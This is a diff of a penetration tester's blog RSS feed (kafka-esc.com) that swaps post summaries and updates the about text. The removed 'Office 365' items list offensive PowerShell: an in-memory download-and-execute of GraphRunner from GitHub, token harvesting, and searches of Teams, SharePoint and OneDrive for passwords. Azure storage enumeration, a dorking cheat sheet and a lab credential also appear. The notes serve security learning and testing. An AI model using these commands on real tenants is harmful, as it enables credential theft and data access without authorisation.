@@ -5,24 +5,9 @@
     <link>https://kafka-esc.com/</link>
     <description>Recent content on [KafkaEsc]</description>
     <generator>Hugo</generator>
-    <language>en</language>
-    <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-    <lastBuildDate>Sat, 07 Sep 2024 14:38:14 +0000</lastBuildDate>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 08 Sep 2024 18:16:14 +0000</lastBuildDate>
     <atom:link href="https://kafka-esc.com/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>Office 365</title>
-      <link>https://kafka-esc.com/copilot-conversations/office-365/</link>
-      <pubDate>Sat, 07 Sep 2024 00:00:00 +0000</pubDate>
-      <guid>https://kafka-esc.com/copilot-conversations/office-365/</guid>
-      <description>GraphRunner Import into memory&#xA;IEX (iwr &amp;#39;https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1&amp;#39;) Get-GraphTokens User and Password Get-GraphTokens –UserPasswordAuth Microsoft Teams Messages GraphRunner Chat&#xA;Search:&#xA;Invoke-SearchTeams -Tokens $tokens -SearchTerm password Dump:&#xA;Invoke-SearchTeams -Tokens $tokens -SearchTerm password Get-TeamsChat -Tokens $tokens Channels&#xA;Get-TeamsChannels Find-ChannelEmails TokenTacticsV2 RefreshTo-MSTeamsToken -domain domain.local AADInternals Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token | Format-Table id,content,deletiontime,*type*,DisplayName Sharepoint and OneDrive Files GraphRunner Search:&#xA;Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm &amp;#39;bonus&amp;#39; MgGraph $userId = &amp;#34;&amp;lt;user-id&amp;gt;&amp;#34; Import-Module Microsoft.Graph.Files Get-MgUserDefaultDrive -UserId $userId Get-MgUserDrive -UserId $UserId -Debug Get-MgDrive -top 1 Powershell code to retrieve the user’s chat messages:</description>
-    </item>
-    <item>
-      <title>Office 365</title>
-      <link>https://kafka-esc.com/posts/2024/09/office-365/</link>
-      <pubDate>Sat, 07 Sep 2024 00:00:00 +0000</pubDate>
-      <guid>https://kafka-esc.com/posts/2024/09/office-365/</guid>
-      <description>GraphRunner Import into memory&#xA;IEX (iwr &amp;#39;https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1&amp;#39;) Get-GraphTokens User and Password Get-GraphTokens –UserPasswordAuth Microsoft Teams Messages GraphRunner Chat&#xA;Search:&#xA;Invoke-SearchTeams -Tokens $tokens -SearchTerm password Dump:&#xA;Invoke-SearchTeams -Tokens $tokens -SearchTerm password Get-TeamsChat -Tokens $tokens Channels&#xA;Get-TeamsChannels Find-ChannelEmails TokenTacticsV2 RefreshTo-MSTeamsToken -domain domain.local AADInternals Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token | Format-Table id,content,deletiontime,*type*,DisplayName Sharepoint and OneDrive Files GraphRunner Search:&#xA;Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm &amp;#39;bonus&amp;#39; MgGraph $userId = &amp;#34;&amp;lt;user-id&amp;gt;&amp;#34; Import-Module Microsoft.Graph.Files Get-MgUserDefaultDrive -UserId $userId Get-MgUserDrive -UserId $UserId -Debug Get-MgDrive -top 1 Powershell code to retrieve the user’s chat messages:</description>
-    </item>
     <item>
       <title></title>
       <link>https://kafka-esc.com/--resources/templates/blog/</link>
@@ -38,11 +23,11 @@
       <description>Scenario After discovering that a public company GitHub repository contained accidentally committed credentials, Mega Big Tech has requested us to investigate the extent of potential exposure. They want to determine if these credentials can be used to access their cloud environment and if any confidential data is at risk.&#xA;Azure credentials Password: Bigt3ch123! IAM user: Jose.Rodriguez@megabigtech.com To quote John Lambert, Defenders think in lists. Attackers think in graphs. As long as this is true, attackers win .</description>
     </item>
     <item>
-      <title>Storage &amp; Vaults 1</title>
-      <link>https://kafka-esc.com/posts/2024/09/storage-vaults-1/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://kafka-esc.com/posts/2024/09/storage-vaults-1/</guid>
-      <description>Storage Accounts List all storage accounts&#xA;Get-AzStorageAccount Get-AzStorageAccount | fl az storage account list --query &amp;#34;[].name&amp;#34; -o tsv Storage Tables az storage table list --account-name custdatabase --output table --auth-mode login Role Assignment for storage objects Get-AzRoleAssignment -Scope &amp;#34;/subscriptions/fce3c371-9ec3-4784-8738-880e93ca657a/resourceGroups/content-static-2/providers/Microsoft.Storage/storageAccounts/custdatabase&amp;#34; | Select-Object DisplayName, RoleDefinitionName List permissions for Storage Account $Acce ss_Token = (Get-AzAccessToken).Token $storageAccount = Get-AzStorageAccount $SubscriptionID = (Get-AzSubscription).Id $ResourceGroupName = $storageAccount.ResourceGroupName $StorageAccountName = $storageAccount.StorageAccountName $URI = &amp;#34;https://management.azure.com/subscriptions/$SubscriptionID/resourceGroups/$ResourceGroupName/providers/Microsoft.Storage/storageAccounts/$StorageAccountName/providers/Microsoft.Authorization/permissions?api-version=2022-04-01&amp;#34; $RequestParams = @{ Method = &amp;#39;GET&amp;#39; Uri = $URI Headers = @{ &amp;#39;Authorization&amp;#39; = &amp;#34;Bearer $Access_Token&amp;#34; } } $Permissions = (Invoke-RestMethod @RequestParams).</description>
+      <title>CVE-2023-43045 - IBM OTP Bypass</title>
+      <link>https://kafka-esc.com/posts/2023/10/cve-2023-43045-ibm-otp-bypass/</link>
+      <pubDate>Tue, 24 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://kafka-esc.com/posts/2023/10/cve-2023-43045-ibm-otp-bypass/</guid>
+      <description>Security Bulletin: IBM Sterling Partner Engagement Manager is vulnerable to one-time password bypass (CVE-2023-43045) Summary IBM Sterling Partner Engagement Manager has addressed a reflected one-time password bypass vulnerability.&#xA;Vulnerability Details CVEID: CVE-2023-43045&#xA;DESCRIPTION: IBM Sterling Partner Engagement Manager could allow a remote user to perform unauthorized actions due to improper authentication.&#xA;CVSS Base score: 5.9&#xA;CVSS Temporal Score: See: https://exchange.xforce.ibmcloud.com/vulnerabilities/266896 for the current score.&#xA;CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N)&#xA;Affected Products and Versions Affected Product(s) Version(s) IBM Sterling Partner Engagement Manager Essentials Edition 6.</description>
     </item>
     <item>
       <title>Add shortcuts to Windows explorer right click menu</title>
@@ -50,13 +35,6 @@
       <pubDate>Mon, 15 Aug 2022 00:00:00 +0000</pubDate>
       <guid>https://kafka-esc.com/posts/2022/08/add-shortcuts-to-windows-explorer-right-click-menu/</guid>
       <description>To add a shortcut to the mouse right-click menu you have to edit the registries at Computer\HKEY_CLASSES_ROOT\Directory\background&#xA;Alternatively you can create a .reg file and execute it. Example creating a shortcut for Atom:&#xA;Windows Registry Editor Version 5.00 [HKEY_CLASSES_ROOT\Directory\background\shell\NameOfApp] @=&amp;#34;Open Atom here&amp;#34; #path to app icon &amp;#34;Icon&amp;#34;=&amp;#34;\&amp;#34;C:\\Users\\Username\\AppData\\Local\\atom\\app.ico\&amp;#34;&amp;#34; [HKEY_CLASSES_ROOT\Directory\background\shell\NameOfApp\command] #path to app executable file (%V to &amp;#34;open in current location&amp;#34;) @=&amp;#34;\&amp;#34;C:\\Users\\Username\\AppData\\Local\\atom\\atom.exe\&amp;#34; %V\&amp;#34;&amp;#34; (Don&amp;rsquo;t forget to change the variable names)&#xA;Copy code to a .</description>
-    </item>
-    <item>
-      <title>Google Dorking Cheat Sheet</title>
-      <link>https://kafka-esc.com/posts/2022/08/google-dorking-cheat-sheet/</link>
-      <pubDate>Mon, 15 Aug 2022 00:00:00 +0000</pubDate>
-      <guid>https://kafka-esc.com/posts/2022/08/google-dorking-cheat-sheet/</guid>
-      <description>Search filters Filter Description Example allintext Searches for occurrences of all the keywords given. allintext:&amp;quot;keyword&amp;quot; intext Searches for the occurrences of keywords all at once or one at a time. intext:&amp;quot;keyword&amp;quot; inurl Searches for a URL matching one of the keywords. inurl:&amp;quot;keyword&amp;quot; allinurl Searches for a URL matching all the keywords in the query. allinurl:&amp;quot;keyword&amp;quot; intitle Searches for occurrences of keywords in title all or one. intitle:&amp;quot;keyword&amp;quot; allintitle Searches for occurrences of keywords all at a time.</description>
     </item>
     <item>
       <title>Swap CAPSLOCK for ESC</title>
@@ -70,7 +48,7 @@
       <link>https://kafka-esc.com/about/</link>
       <pubDate>Sun, 14 Aug 2022 00:00:00 +0000</pubDate>
       <guid>https://kafka-esc.com/about/</guid>
-      <description>Currently working as a freelance videographer. Stories are how we learn, communicate and remember. I have always been fascinated by the power of moving pictures, and I&amp;rsquo;m grateful for being able to make a living by sharing my creations. Although making films is one of my biggest passions, I think it would suit better as a hobby. At the moment, I&amp;rsquo;m seeking to transition to the InfoSec field.&#xA;I&amp;rsquo;m looking for a Penetration Testing position.</description>
+      <description>So, you&amp;rsquo;re a pentester? Yes, I&amp;rsquo;m currently working as a Penetration Tester for SwissPost. As a pentester, I&amp;rsquo;ve helped numerous organizations strengthen their defenses against cyber threats. However, I believe that true risk assessment requires more than just identifying vulnerabilities — it demands a deeper understanding of an organization&amp;rsquo;s overall security posture. That&amp;rsquo;s the reason I also like to learn and apply Red Teaming techniques, which provide a more comprehensive and realistic view of an organization&amp;rsquo;s risk exposure.</description>
     </item>
     <item>
       <title></title>
